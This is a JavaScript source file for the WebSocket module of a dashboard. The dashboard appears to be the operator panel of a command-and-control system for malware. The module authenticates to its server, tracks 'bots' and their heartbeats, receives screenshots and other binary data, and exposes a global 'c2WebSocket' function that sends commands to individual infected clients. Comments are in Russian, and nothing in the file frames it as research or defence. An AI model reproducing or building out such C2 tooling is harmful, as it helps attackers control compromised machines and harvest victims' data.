/* frontend/dashboard/js/modules/websocket/connection.js */
import { updateClient, updateClients } from '../data/clients.js';
import { decodePacket, encodePacket, isJson } from './protocol.js';

let ws;

export function connectWebSocket() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');

    if (!token || !login) return window.location.href = '/sidebar/auth/auth.html';

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${prot}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("[WS] Connected");
        // Пинг-понг для поддержания соединения
        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("SERVER", "ping")), 25000);
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg || pkg.module === 'pong') return;

        if (pkg.module === 'AuthUpdate') {
            localStorage.removeItem('auth_token');
            return window.location.reload();
        }

        // Если модуль в списке JSON или это ответ от сервера
        if (isJson(pkg.module)) {
            try {
                const decodedText = new TextDecoder().decode(pkg.payload);
                const rawData = JSON.parse(decodedText);

                // Если пришел список или данные бота
                if (pkg.module === 'ClientList' || Array.isArray(rawData)) {
                    updateClients(Array.isArray(rawData) ? rawData : [rawData]);
                } else {
                    // Обработка данных бота (DataScribe или другие)
                    updateClient({ ...rawData, id: rawData.id || pkg.id }, rawData.net === 'heartbeat');
                }
            } catch (e) {
                console.error("[WS] JSON Parse Error in module:", pkg.module, e);
            }
        } else {
            // Для сырых бинарных данных (скриншоты и т.д.)
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
        }
    };

    ws.onclose = (e) => {
        if (e.code === 1008) {
            localStorage.clear();
            window.location.href = '/sidebar/auth/auth.html';
        } else {
            setTimeout(connectWebSocket, 5000); // Авто-реконнект
        }
    };

    window.c2WebSocket = {
        send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay))
    };
}